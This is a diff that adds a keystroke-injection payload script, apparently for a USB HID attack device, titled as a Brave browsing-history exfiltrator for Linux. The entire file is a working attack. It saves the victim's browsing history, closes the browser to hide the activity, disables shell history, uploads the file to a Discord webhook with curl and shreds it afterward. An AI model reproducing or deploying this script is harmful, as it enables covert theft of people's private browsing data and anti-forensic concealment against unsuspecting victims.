@@ -1,0 +1,58 @@
+REM TITLE: Brave Browsing History Exfil Linux.txt
+REM AUTHOR: OSINTI4L
+REM TARGET OS: Linux (tested on Pop!_OS)
+REM DESCRIPTION: Opens Brave Browser and downloads user browsing history to a "History.html" file. It then exfiltrates the file via Discord webhook. The terminal session history is disabled and file is shredded post exfiltration to obfuscate activity. To work, add Discord webhook to line 49 and path to home directory/Downloads on line 51.
+
+REM Begin attack:
+ATTACKMODE HID
+DELAY 1000
+
+REM Launching Brave Browser:
+INJECT_MOD
+    GUI
+    DELAY 200
+    STRING brav
+    DELAY 100
+    ENTER
+DELAY 500
+
+REM Opening download history and saving as "History.html":
+CTRL h
+DELAY 150
+CTRL s
+DELAY 150
+ENTER
+DELAY 300
+
+REM Opening window settings and using DOWN loop to select "close", closing browser to obfuscate that brave was opened:
+ALT SPACE
+DELAY 200
+VAR $FEE = 8
+    WHILE ( $FEE > 0 )
+    DOWN
+    $FEE = ( $FEE -1 )
+END_WHILE
+ENTER
+DELAY 200
+
+REM Popping terminal window:
+CTRL ALT t
+DELAY 300
+
+REM Unsetting session history to obfuscate activity and changing directory to file location:
+STRINGLN unset HISTFILE
+DELAY 50
+STRINGLN cd ~/Downloads
+DELAY 50
+
+REM Exfiltrating "History.html" via Discord webhook:
+DEFINE WEBHOOK_URL https://discord.com/api/PLACE/DISCORD/WEBHOOK/
+    STRINGLN curl -X POST -H "Content-Type: multipart/form-data" \
+    STRINGLN -F "file=@/PATH/TO/HOME/Downloads/History.html" \
+    STRINGLN -F "content=$ Loot Incoming $" \
+    STRINGLN WEBHOOK_URL
+ 	DELAY 100
+
+REM Obfuscation stage, shred "History.html" and exit:
+STRINGLN shred -fuz History.html
+STRINGLN exit
